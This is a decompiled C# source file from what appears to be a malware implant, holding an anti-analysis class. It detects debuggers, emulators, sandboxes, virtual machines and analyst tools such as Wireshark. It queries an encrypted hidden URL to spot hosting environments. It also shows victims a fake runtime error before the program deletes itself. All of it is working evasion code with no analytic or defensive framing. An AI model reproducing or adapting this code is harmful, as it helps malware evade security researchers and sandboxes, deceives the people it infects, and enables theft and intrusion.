using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Client.Modules.Implant;

internal sealed class AntiAnalysis
{
	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	private static bool Debugger()
	{
		bool isDebuggerPresent = false;
		try
		{
			CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
			return isDebuggerPresent;
		}
		catch
		{
			return isDebuggerPresent;
		}
	}

	private static bool Emulator()
	{
		try
		{
			long ticks = DateTime.Now.Ticks;
			Thread.Sleep(10);
			if (DateTime.Now.Ticks - ticks < 10L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool Hosting()
	{
		try
		{
			return new WebClient().DownloadString(StringsCrypt.Decrypt(new byte[48]
			{
				150, 74, 225, 199, 246, 42, 22, 12, 92, 2,
				165, 125, 115, 20, 210, 212, 231, 87, 111, 21,
				89, 98, 65, 247, 202, 71, 238, 24, 143, 201,
				231, 207, 181, 18, 199, 100, 99, 153, 55, 114,
				55, 39, 135, 191, 144, 26, 106, 93
			})).Contains("true");
		}
		catch
		{
		}
		return false;
	}

	private static bool Processes()
	{
		Process[] processes = Process.GetProcesses();
		string[] source = new string[8] { "processhacker", "netstat", "netmon", "tcpview", "wireshark", "filemon", "regmon", "cain" };
		Process[] array = processes;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				Process process = array[num];
				if (source.Contains(process.ProcessName.ToLower()))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static bool SandBox()
	{
		string[] array = new string[5] { "SbieDll.dll", "SxIn.dll", "Sf2.dll", "snxhk.dll", "cmdvrt32.dll" };
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				if (GetModuleHandle(array[num]).ToInt32() != 0)
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static bool VirtualBox()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		ManagementObjectEnumerator enumerator;
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				enumerator = val2.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						if ((current.get_Item("Manufacturer").ToString()!.ToLower() == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || current.get_Item("Manufacturer").ToString()!.ToLower().Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch
		{
			return true;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementBaseObject current2 = enumerator.get_Current();
				if (current2.GetPropertyValue("Name").ToString()!.Contains("VMware") && current2.GetPropertyValue("Name").ToString()!.Contains("VBox"))
				{
					return true;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return false;
	}

	public static void FakeErrorMessage()
	{
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		string text = StringsCrypt.GenerateRandomData("1");
		text = "0x" + text.Substring(0, 5);
		MessageBox.Show("Exit code " + text, "Runtime error", (MessageBoxButtons)5, (MessageBoxIcon)16);
		SelfDestruct.Melt();
	}
}
